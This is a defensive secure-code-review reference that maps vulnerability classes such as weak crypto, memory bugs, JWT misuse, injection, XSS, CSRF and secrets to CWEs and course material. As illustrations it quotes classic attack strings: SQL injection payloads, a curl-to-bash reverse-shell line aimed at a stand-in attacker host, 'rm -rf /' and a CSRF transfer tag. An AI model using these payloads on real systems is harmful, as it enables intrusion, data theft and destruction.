# Security Checks Reference

Organized by vulnerability class. Each entry maps to a CWE, explains the concept,
and links to the relevant Stanford/MIT course section.

---

## 1. Cryptography Misuse

### 1.1 Broken or Weak Algorithms

**CWE-327** — Use of a Broken or Risky Cryptographic Algorithm

Check for:

- MD5 or SHA-1 used for password hashing or integrity (broken — collision attacks exist)
- DES or 3DES (56-bit key; brute-forceable; Sweet32 attack on 3DES)
- RC4 (biased keystream; NOMORE, RC4NOMORE attacks)
- ECB mode for block cipher (deterministic — identical plaintext blocks produce identical ciphertext; leaks patterns)
- RSA with key size < 2048 bits
- ECC with curve P-192 or custom/non-standard curves
- `random()` or `Math.random()` used for security-sensitive randomness (not cryptographically secure)

**Why it matters:** Weak algorithms have known attacks that break them in feasible time or with feasible data. MD5 collisions can be generated in seconds on a laptop. ECB mode famously reveals structure in encrypted images (the "ECB penguin"). Choosing the wrong algorithm makes all downstream security properties void regardless of how correctly the rest of the system is implemented.

**Reference:** [Stanford CS255 Lec 2-3](https://crypto.stanford.edu/~dabo/cs255/syllabus.html) — Stream ciphers and block ciphers

---

### 1.2 Nonce / IV Misuse

**CWE-330** + **CWE-338**

Check for:

- Fixed/hardcoded IV (e.g., `iv = b'\x00' * 16`)
- IV derived from predictable data (counter starting at 0 without randomness, timestamp)
- IV reuse across encryptions with the same key — **catastrophic for GCM** (reveals keystream; allows authentication bypass)
- Counter reuse in CTR mode (XOR of two ciphertexts reveals XOR of plaintexts)
- Nonce not stored/transmitted alongside ciphertext

**Why it matters:** In GCM mode, reusing a (key, nonce) pair allows an attacker to recover the authentication key H (computed as AES_K(0^128)), which breaks all authentication. With H, an attacker can forge any authentication tag. In CTR mode, reusing a counter means C1 ⊕ C2 = P1 ⊕ P2 — an attacker who knows one plaintext recovers the other. This is how TLS CBC padding oracle attacks and the "two-time pad" attacks work.

**Reference:** [Stanford CS255 Lec 8](https://crypto.stanford.edu/~dabo/cs255/syllabus.html) — Authenticated encryption

---

### 1.3 Missing Authentication (Encryption Without Integrity)

**CWE-353**

Check for:

- AES-CBC or AES-CTR used without a MAC (encrypt-only)
- Custom MAC constructions (e.g., `H(key || ciphertext)` — vulnerable to length extension)
- MAC computed over plaintext rather than ciphertext (Encrypt-and-MAC, not Encrypt-then-MAC)
- HMAC key reuse across different contexts

**Why it matters:** Unauthenticated encryption is malleable — an attacker can flip bits in the ciphertext and cause predictable changes in the decrypted plaintext without knowing the key. The classic example: AES-CBC bit-flipping lets an attacker change a bank transfer amount without decrypting the message. Padding oracle attacks (Vaudenay 2002, POODLE) exploit unauthenticated CBC to achieve full decryption. Always use AEAD (AES-GCM, ChaCha20-Poly1305).

**Reference:** [Stanford CS255 Lec 8](https://crypto.stanford.edu/~dabo/cs255/syllabus.html) — Authenticated encryption

---

### 1.4 RSA Misuse

**CWE-780** + **CWE-326**

Check for:

- Raw RSA encryption (`m^e mod n`) without OAEP padding — textbook RSA is deterministic and malleable
- PKCS#1v1.5 encryption padding — vulnerable to Bleichenbacher's attack (1998, still relevant)
- RSA signing without proper hash (signing raw data allows existential forgery)
- Small public exponent e=3 with unpadded messages (Håstad's broadcast attack)
- RSA key generation with insufficient entropy
- Using RSA for key agreement instead of DH/ECDH (RSA lacks forward secrecy)

**Why it matters:** Bleichenbacher's 1998 attack on PKCS#1v1.5 requires ~1 million decryption oracle queries to recover an RSA-encrypted value. In 2018, ROBOT showed this attack still worked against major TLS implementations including Facebook, Citrix, and F5. Raw RSA is a trapdoor permutation, not an encryption scheme — it must be combined with proper padding to achieve semantic security (IND-CPA).

**Reference:** [Stanford CS255 Lec 12](https://crypto.stanford.edu/~dabo/cs255/syllabus.html) — RSA and trapdoor functions

---

### 1.5 Timing Side-Channels in Crypto

**CWE-208**

Check for:

- Non-constant-time string/byte comparison for secrets (`==` operator, `strcmp`, `memcmp`)
- Early return from MAC verification (returns `false` on first byte mismatch → timing oracle)
- Variable-time operations on secret data (branching on secret bits, table lookups indexed by secret)
- Python `==` on bytes objects (short-circuits on first mismatch)

**Why it matters:** If MAC verification returns after 1 microsecond on a wrong first byte and after 8 microseconds on a wrong last byte, an attacker can measure response times to brute-force MACs byte by byte. This reduces a 256-bit brute-force search (2^256 operations) to 256 × 256 = 65,536 operations. Use `hmac.compare_digest()` (Python), `crypto.timingSafeEqual()` (Node.js), or `subtle.timeSafeEqual()`.

**Reference:** [MIT 6.566 Lec 5](https://css.csail.mit.edu/6.858/2024/) — CPU side-channels

---

## 2. Memory Safety (C, C++, unsafe Rust, and others)

### 2.1 Buffer Overflow

**CWE-120, CWE-121, CWE-122**

Check for:

- `strcpy`, `strcat`, `sprintf`, `gets` — no length check, always dangerous
- `strncpy` with n = sizeof(dest) but forgetting null terminator
- Manual index arithmetic without bounds check
- `memcpy` with user-controlled length parameter
- Stack-allocated arrays with user-controlled size (`char buf[user_len]` — VLA stack overflow)

**Why it matters:** A stack buffer overflow overwrites the return address saved on the stack. When the vulnerable function returns, execution jumps to the attacker's chosen address. Combined with shellcode injection (pre-NX) or ROP chains (post-NX), this achieves arbitrary code execution. The Morris Worm (1988) used this attack. Heartbleed (2014) was a heap buffer over-read — not an overflow but the same root cause (missing bounds check).

**Reference:** [MIT 6.566 Lec 4, 10](https://css.csail.mit.edu/6.858/2024/) — Buffer overflow defenses

---

### 2.2 Use-After-Free / Double-Free

**CWE-416, CWE-415**

Check for:

- Pointer used after `free()` / `delete`
- `free()` called twice on the same pointer
- References/iterators invalidated by container modification (C++ STL)
- Dangling pointer stored in a struct after the pointed-to object is freed
- `shared_ptr` cycles causing objects to never be freed (memory "leak" not UAF, but related)

**Why it matters:** After `free()`, the memory may be reclaimed and reallocated to another object. A use-after-free then accesses that new object's memory — a type confusion. Attackers deliberately trigger allocation of a controlled object at the freed address, then use the stale pointer to corrupt it. UAF is the dominant class of browser exploit (Chrome, Firefox V8 JIT, WebKit). In 2023, UAF accounted for ~40% of exploited Chrome CVEs.

**Reference:** [MIT 6.566 Lec 10](https://css.csail.mit.edu/6.858/2024/) — Buffer overflow defenses

---

### 2.3 Integer Overflow / Underflow

**CWE-190, CWE-191**

Check for:

- Allocation size computed by multiplication: `malloc(count * sizeof(T))` — if count is large, overflows to small value
- Signed/unsigned mismatch in comparisons: `if (len > MAX)` where `len` is `int` and user can pass negative
- Length field from untrusted input used in arithmetic without overflow check
- `size_t` (unsigned) subtracted from smaller value — wraps to huge number

**Why it matters:** `malloc(count * sizeof(T))` where count = 0x80000001 and sizeof(T) = 4 gives `malloc(4)` due to 32-bit overflow. The subsequent copy fills a 4-byte allocation with 0x80000001 × 4 bytes — a heap buffer overflow. This is how CVE-2018-11776 (Apache Struts) and many libpng vulnerabilities worked. Always use `calloc()` (which checks for overflow internally) or explicit overflow checks before multiplication.

**Reference:** [MIT 6.566 Lec 10](https://css.csail.mit.edu/6.858/2024/) — Buffer overflow defenses

---

## 3. Authentication and Session Management

### 3.1 Weak Password Hashing

**CWE-916**

Check for:

- Plaintext password storage
- MD5, SHA-1, SHA-256 used directly for passwords (fast hash — GPU can compute 10^10/second)
- SHA-256(password + salt) — still a fast hash, susceptible to GPU cracking
- Missing salt (enables rainbow table attacks)
- Short or static salt
- bcrypt work factor < 10 (too fast on modern hardware)

**Why it matters:** Password hashing must be deliberately slow to resist offline cracking. When a database is breached, attackers can try billions of password candidates per second against fast hashes (MD5: ~200 billion/sec on an RTX 4090). bcrypt with cost 12 runs ~3,000/sec — a 70-million-fold slowdown. Use bcrypt (cost ≥ 12), scrypt, or Argon2id (winner of the 2015 Password Hashing Competition and recommended by OWASP).

**Reference:** [Stanford CS255 Lec 15](https://crypto.stanford.edu/~dabo/cs255/syllabus.html) — Identification protocols

---

### 3.2 Insecure Session Tokens

**CWE-330, CWE-331**

Check for:

- Session tokens generated with `random()`, `Math.random()`, `rand()` — not cryptographically secure
- Predictable token structure (user ID + timestamp)
- Short tokens (< 128 bits of entropy)
- Tokens not invalidated on logout
- Tokens stored in localStorage (accessible to XSS) rather than HttpOnly cookies
- Session fixation: accepting user-supplied session ID before authentication

**Why it matters:** `Math.random()` in V8 (Node.js/Chrome) uses xorshift128+, which has only 128 bits of state. If an attacker observes a few session tokens, they can reconstruct the internal state and predict all future tokens. Artem Loginov demonstrated this against a major gambling site in 2016. Tokens must use `crypto.getRandomValues()` (browser), `secrets.token_bytes()` (Python), or `crypto/rand` (Go).

**Reference:** [Stanford CS255 Lec 15](https://crypto.stanford.edu/~dabo/cs255/syllabus.html) — Identification protocols

---

### 3.3 JWT Misuse

**CWE-347**

Check for:

- `alg: none` accepted (allows unsigned tokens)
- Algorithm confusion: server accepts both HS256 and RS256 — attacker switches RS256 public key as HS256 symmetric key
- JWT secret hardcoded or too short
- `exp` (expiration) not validated
- Sensitive data in payload (JWTs are base64-encoded, not encrypted — readable by anyone)
- JWT used as a session token without server-side revocation (can't invalidate on logout)

**Why it matters:** The `alg: none` vulnerability allowed bypassing authentication on hundreds of production systems. The algorithm confusion attack works because the RS256 public key is often publicly available — an attacker signs with the public key using HS256 and the server verifies it successfully. Auth0 and many JWT libraries were vulnerable in 2015–2017. Always use an allowlist of accepted algorithms, never `alg: none`.

**Reference:** [Stanford CS255 Lec 13](https://crypto.stanford.edu/~dabo/cs255/syllabus.html) — Digital signatures

---

## 4. Injection Vulnerabilities

### 4.1 SQL Injection

**CWE-89**

Check for:

- String concatenation/interpolation in SQL queries: `"SELECT * FROM users WHERE name='" + user_input + "'"`
- f-strings or format strings building SQL
- ORM raw query methods with user input: `execute(raw_sql % user_input)`
- Stored procedures that internally concatenate strings

**Why it matters:** SQL injection allows an attacker to modify the structure of a database query. `' OR '1'='1` bypasses authentication. `'; DROP TABLE users; --` deletes data. `UNION SELECT username, password FROM admin--` exfiltrates credentials. The fix (parameterized queries) was known since the 1990s yet SQL injection remained the #1 OWASP vulnerability for over a decade. Always use prepared statements / parameterized queries.

---

### 4.2 Command Injection

**CWE-78**

Check for:

- `os.system()`, `subprocess.call(shell=True)` with user-controlled input
- `exec()`, `eval()` with user input (Python, JS)
- Template engines rendering user input without escaping
- Path traversal in file operations: `open(user_path)` without sanitization

**Why it matters:** If user input reaches a shell command, the attacker controls execution. `; rm -rf /` appended to a filename deletes the filesystem. `$(curl attacker.com/shell.sh | bash)` downloads and executes a reverse shell. Use `subprocess.run([cmd, arg1, arg2])` with a list (no shell expansion) and validate all inputs against an allowlist.

---

## 5. Web Security

### 5.1 Cross-Site Scripting (XSS)

**CWE-79**

Check for:

- User input rendered in HTML without escaping: `innerHTML = user_data`
- Server-side template rendering with unescaped variables: `{{ user_input | safe }}`
- DOM-based XSS: `document.write(location.hash)`
- CSP (Content Security Policy) missing or too permissive (`unsafe-inline`)
- `httpOnly` flag missing on session cookies (allows JS to read them after XSS)

**Why it matters:** XSS executes attacker-controlled JavaScript in the victim's browser, in the context of the legitimate site. This bypasses the Same-Origin Policy. The attacker can read session cookies, make authenticated requests on the user's behalf, capture keystrokes, and redirect to phishing pages. The Samy worm (2005) spread across MySpace in 20 hours using XSS. Always HTML-escape output and implement a restrictive CSP.

**Reference:** [MIT 6.566 Lec 9](https://css.csail.mit.edu/6.858/2024/) — Web security model

---

### 5.2 Cross-Site Request Forgery (CSRF)

**CWE-352**

Check for:

- State-changing endpoints without CSRF token
- CSRF token not tied to session (static token reusable across sessions)
- Relying on `Referer` header (easily suppressed)
- SameSite cookie attribute missing or set to `None`
- GET requests that modify state (CSRF via `<img src="...">`)

**Why it matters:** CSRF forces a logged-in user's browser to make a request the user didn't intend. A malicious page contains `<img src="https://bank.com/transfer?to=attacker&amount=10000">`. The browser automatically includes the victim's cookies, making the request appear authenticated. The bank processes the transfer. Double-submit cookie pattern and `SameSite=Strict` cookies are the primary defenses.

**Reference:** [MIT 6.566 Lec 9](https://css.csail.mit.edu/6.858/2024/) — Web security model

---

## 6. Secrets and Configuration

### 6.1 Hardcoded Secrets

**CWE-798**

Check for:

- API keys, passwords, tokens in source code
- Private keys committed to the repository
- Secrets in comments ("temporary password: ...")
- Default credentials not changed
- Secrets in environment variable files committed to git (`.env` in repo)
- Secrets in Docker images (baked in via `ENV` or `COPY`)

**Why it matters:** GitHub's secret scanning found 12.8 million secrets exposed in public repositories in 2023. Once a secret is committed, it exists in git history even after deletion — `git log -p` reveals it. Rotation is the only fix after exposure. Use a secrets manager (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) and pre-commit hooks (detect-secrets, trufflehog) to prevent commits.

---

### 6.2 Insecure TLS Configuration

**CWE-326**

Check for:

- `verify=False` in Python requests / `rejectUnauthorized: false` in Node.js TLS
- Accepting self-signed certificates in production
- TLS 1.0 or 1.1 enabled (deprecated; POODLE, BEAST attacks)
- Weak cipher suites: RC4, DES, EXPORT ciphers, NULL cipher
- Certificate pinning bypass via user-installed certificates
- HTTP used for any sensitive endpoint

**Why it matters:** Disabling certificate verification removes all protection against man-in-the-middle attacks. Any network observer can intercept, read, and modify the "encrypted" traffic. `requests.get(url, verify=False)` is a frequent shortcut in development that accidentally ships to production. The attacker positions between client and server, presents their own certificate, and proxies the connection — both sides think they're communicating securely.

**Reference:** [MIT 6.566 Lec 15](https://css.csail.mit.edu/6.858/2024/) — Secure channels

---

## 7. Dependency and Supply Chain

### 7.1 Vulnerable Dependencies

**CWE-1395**

Check for:

- Outdated packages with known CVEs (`npm audit`, `pip-audit`, `safety`, `trivy`)
- Pinned versions without hash verification (allows dependency confusion attacks)
- Unpinned transitive dependencies
- Dependencies from unofficial sources (typosquatting: `colourama` vs `colorama`)
- No SBOM (Software Bill of Materials)

**Why it matters:** The SolarWinds attack (2020) compromised 18,000 organizations by injecting malicious code into a build dependency. Log4Shell (2021) was in a transitive dependency that most users didn't know they had. XZ Utils (2024) was a two-year social engineering supply chain attack. Always pin exact versions with hash verification, generate SBOMs, and run dependency scanning in CI.

---
